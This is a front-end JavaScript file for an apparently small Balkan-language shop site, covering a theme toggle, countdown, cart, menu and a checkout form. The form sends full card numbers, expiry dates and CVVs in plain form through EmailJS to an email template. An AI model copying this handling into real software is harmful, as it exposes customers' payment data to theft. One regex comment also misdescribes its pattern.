const daniEl = document.getElementById("dani");
const satiEl = document.getElementById("sati");
const minuteEl = document.getElementById("minute");
const sekundeEl = document.getElementById("sekunde");
const hasTimer = daniEl && satiEl && minuteEl && sekundeEl;

const toggle = document.getElementById("dark-mode-toggle");
const toggleMob = document.getElementById("dark-mode-toggle-mob");
const logo = document.getElementById("logo");

const korpaToggle = document.getElementById("korpa-toggle");
const korpaToggleDesktop = document.getElementById("korpa-toggle-desktop");
const korpaPanel = document.getElementById("korpa-panel");
const korpaOverlay = document.getElementById("korpa-overlay");
const korpaZatvori = document.getElementById("korpa-zatvori");

const brojac = document.querySelectorAll(".stat-broj");

const hamburger = document.getElementById("hamburger");
const mobMeni = document.getElementById("mob-meni");
const overlay = document.getElementById("mob-overlay");
const kontejner = document.getElementById("kartice-kontejner");
const template = document.querySelector(".template-kartice");

const form = document.querySelector(".Kontakt form");
const ime = document.getElementById("ime");
const prezime = document.getElementById("prezime");
const email = document.getElementById("email");
const tel = document.getElementById("tel");
const brojK = document.getElementById("BrojK");
const datum = document.getElementById("datum");
const cvv = document.getElementById("cvv");
const bankaime = document.getElementById("bankaime");

korpaToggleDesktop.addEventListener("click", otvoriKorpu);
korpaToggle.addEventListener("click", otvoriKorpu);
korpaZatvori.addEventListener("click", zatvoriKorpu); 
korpaOverlay.addEventListener("click", zatvoriKorpu);

// Definisanje krajnjeg datuma countdown timera
const konacno = new Date("2026-07-01T20:00:00").getTime();

// Sistemski toggle
window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", e => {

    const prefersDark = e.matches;

    // Promjena teme
    document.body.classList.toggle("dark", prefersDark);

    // Promjena logo slike
    logo.src = prefersDark
        ? "images/tamni-logo.png"
        : "images/svjetli-logo.png";

    // Sync checkboxova
    toggle.checked = prefersDark;

    if (toggleMob) {
        toggleMob.checked = prefersDark;
    }

    // Ažuriraj spremljenu temu
    localStorage.setItem("theme", prefersDark ? "dark" : "light");

});

// Provjera prethodno sačuvane teme
if (localStorage.getItem("theme") === "dark") {
  document.body.classList.add("dark");
  logo.src = "images/tamni-logo.png";
  toggle.checked = true;
  if (toggleMob) toggleMob.checked = true;
}

// desktop toggle
toggle.addEventListener("change", () => {
  document.body.classList.toggle("dark", toggle.checked);

  if (toggle.checked) {
    localStorage.setItem("theme", "dark");
    logo.src = "images/tamni-logo.png";
  } else {
    localStorage.setItem("theme", "light");
    logo.src = "images/svjetli-logo.png";
  }

  if (toggleMob) toggleMob.checked = toggle.checked;
});

// mobile toggle 
if (toggleMob) {
  toggleMob.addEventListener("change", () => {
    document.body.classList.toggle("dark", toggleMob.checked);

    if (toggleMob.checked) {
      localStorage.setItem("theme", "dark");
      logo.src = "images/tamni-logo.png";
    } else {
      localStorage.setItem("theme", "light");
      logo.src = "images/svjetli-logo.png";
    }

    toggle.checked = toggleMob.checked;
  });
}

// Formatiranje vremena (dodavanje nule ispred brojeva < 10)
function format(n){
  return n < 10 ? "0" + n : n;
}

// Funkcija za osvježavanje countdown timera
function osvjezitajmer() {
   if (!hasTimer) return;

  const trenutno = new Date().getTime();
  const razlika = konacno - trenutno;

  if (razlika <= 0) {
    daniEl.textContent = "00";
    satiEl.textContent = "00";
    minuteEl.textContent = "00";
    sekundeEl.textContent = "00";
    return;
  }

  const sekunde = Math.floor((razlika / 1000) % 60);
  const minute = Math.floor((razlika / (1000 * 60)) % 60);
  const sati = Math.floor((razlika / (1000 * 60 * 60)) % 24);
  const dani = Math.floor(razlika / (1000 * 60 * 60 * 24));

  daniEl.textContent = format(dani);
  satiEl.textContent = format(sati);
  minuteEl.textContent = format(minute);
  sekundeEl.textContent = format(sekunde);
}
// Pokretanje timera
if (hasTimer) {
  osvjezitajmer();
  setInterval(osvjezitajmer, 1000);
}

// Funkcija za otvaranje korpe
function otvoriKorpu() { 
  korpaPanel.classList.add("otvorena"); 
  korpaOverlay.classList.add("aktivna"); 
}

// Funkcija za zatvaranje korpe
function zatvoriKorpu() { 
  korpaPanel.classList.remove("otvorena"); 
  korpaOverlay.classList.remove("aktivna"); 
}

brojac.forEach(brojac => {
    const target = +brojac.getAttribute("data-target");
    let count = 0;

    const speed = Math.ceil(target / 100); // brzina animacije

    const updateCount = () => {
        count += speed;

        if (count < target) {
            brojac.textContent = count + "+";
            requestAnimationFrame(updateCount);
        } else {
            brojac.textContent = target + "+";
        }
    };

    updateCount();
});

// otvaranje/zatvaranje menija
hamburger.addEventListener("click", () => {
    hamburger.classList.toggle("aktivan");
    mobMeni.classList.toggle("aktivan");
    overlay.classList.toggle("aktivna");
});

// klik na overlay zatvara meni
overlay.addEventListener("click", () => {
    hamburger.classList.remove("aktivan");
    mobMeni.classList.remove("aktivan");
    overlay.classList.remove("aktivna");
});

// klik na link zatvara meni
document.querySelectorAll(".mob-meni a").forEach(link => {
    link.addEventListener("click", () => {
        hamburger.classList.remove("aktivan");
        mobMeni.classList.remove("aktivan");
        overlay.classList.remove("aktivna");
    });
});

// Ovaj regex za validaciju email adrese sam pronašao uz pomoć ChatGPT-a.
// Regex provjerava da email ima ispravan format (tekst@domena.tld),
// gdje ^ označava početak, \w i .- dopuštaju znakove prije @,
// a {2,} osigurava da domena ima najmanje 2 znaka.
const imeRegex = /^[A-Za-zČĆŽŠĐčćžšđ\s]{2,}$/;
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const telRegex = /^[0-9+\s]{6,20}$/;
const cardRegex = /^[0-9]{16}$/;
const cvvRegex = /^[0-9]{3,4}$/;

// funkcija za validaciju
function validacija(input, regex, poruka) {
  if (!input) return true;

  const value = input.value.trim();
  const error = input.nextElementSibling;

  const isValid = regex.test(value);

  if (!isValid) {
    error.textContent = poruka;
    return false;
  } else {
    error.textContent = "";
    return true;
  }
}

// submit
form.addEventListener("submit", function (e) {
  e.preventDefault();

  let valid = true;

  valid &= validacija(ime, imeRegex, "Unesite ispravno ime");
  valid &= validacija(prezime, imeRegex, "Unesite ispravno prezime");
  valid &= validacija(email, emailRegex, "Unesite validan email");
  valid &= validacija(tel, telRegex, "Unesite validan broj telefona");
  valid &= validacija(brojK, cardRegex, "Kartica mora imati 16 brojeva");
  valid &= validacija(cvv, cvvRegex, "CVV mora imati 3 ili 4 broja");
  valid &= validacija(bankaime, imeRegex, "Unesite ime vlasnika kartice");

  if (valid) {
  const params = {
    ime: ime.value,
    prezime: prezime.value,
    email: email.value,
    tel: tel.value,
    brojK: brojK.value,
    datum: datum.value,
    cvv: cvv.value,
    bankaime: bankaime.value
  };

  emailjs.send("service_iyltaxr", "template_r3mbv29", params)
    .then(() => {
      form.reset();
    })
    .catch(() => {
      alert("Greška pri slanju emaila!");
    });
}
});

// reset
form.addEventListener("reset", () => {
  const errors = document.querySelectorAll(".error");

  errors.forEach(error => {
    error.textContent = "";
  });
});

